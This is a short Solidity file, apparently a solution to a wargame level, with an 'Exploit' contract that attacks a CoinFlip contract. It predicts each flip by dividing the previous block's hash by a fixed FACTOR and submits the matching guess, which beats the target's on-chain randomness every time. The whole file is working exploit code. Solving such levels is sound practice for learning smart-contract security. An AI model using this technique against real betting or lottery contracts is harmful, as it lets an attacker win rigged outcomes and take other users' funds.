pragma solidity ^0.4.18;

contract CoinFlip {
    uint256 public consecutiveWins;
    function flip(bool _guess) public returns (bool) { }
}

contract Exploit {
     
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    CoinFlip coinFlipContract;
    
    constructor(address _coinFlipAddress) public payable {
        coinFlipContract = CoinFlip(_coinFlipAddress);
    }
    
    function getConsecutiveWins() public returns (uint256) {
        return uint256(coinFlipContract.consecutiveWins());
    }
    
    function guessFlip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
        bool side = coinFlip == 1 ? true : false;
        coinFlipContract.flip(side);
    }
}